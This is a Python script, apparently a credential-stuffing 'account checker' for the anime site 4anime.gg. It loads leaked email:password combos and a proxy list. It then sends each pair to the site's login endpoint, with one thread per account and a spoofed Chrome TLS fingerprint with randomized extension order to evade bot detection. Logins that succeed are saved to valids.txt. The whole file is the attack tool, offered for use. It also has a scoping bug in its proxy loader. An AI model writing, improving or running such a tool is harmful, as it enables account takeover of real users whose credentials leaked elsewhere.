import tls_client
import threading
import random

proxies = 'proxies.txt'
combo= 'combo.txt'
valids = 'valids.txt'

headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://4anime.gg',
    'priority': 'u=1, i',
    'referer': 'https://4anime.gg/login',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Brave";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

def load_proxies():
    with open(proxies, 'r', encoding='utf-8') as file:
        proxies = [line.strip() for line in file]
    return proxies

def load_accounts():
    with open(combo, 'r', encoding='utf-8') as file:
        accounts = [line.strip() for line in file]
    return accounts

def save_valid_account(account):
    with open(valids, 'a', encoding='utf-8') as file:
        file.write(f'{account}\n')

def check_account(account, proxy):
    email, password = account.split(':')
    data = {'email': email, 'password': password}
    
    proxies = {
        'http': 'http://' + proxy,
        'https': 'http://' + proxy
    }

    session = tls_client.Session(
        client_identifier="chrome_124",
        random_tls_extension_order=True
    )
    session.headers.update(headers)
    session.proxies.update(proxies)
    
    try:
        response = session.post('https://4anime.gg/ajax/login', data=data)
        if 'success' in response.text:
            save_valid_account(account)
            print(f'Success: {account} with proxy {proxy}')
        else:
            print(f'Failed: {account} with proxy {proxy}')
    except Exception as e:
        print(f'Error: {e} with proxy {proxy}')

def run_threads():
    proxies = load_proxies()
    accounts = load_accounts()
    
    threads = []
    for account in accounts:
        proxy = random.choice(proxies)
        thread = threading.Thread(target=check_account, args=(account, proxy))
        threads.append(thread)
        thread.start()
        
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    run_threads()
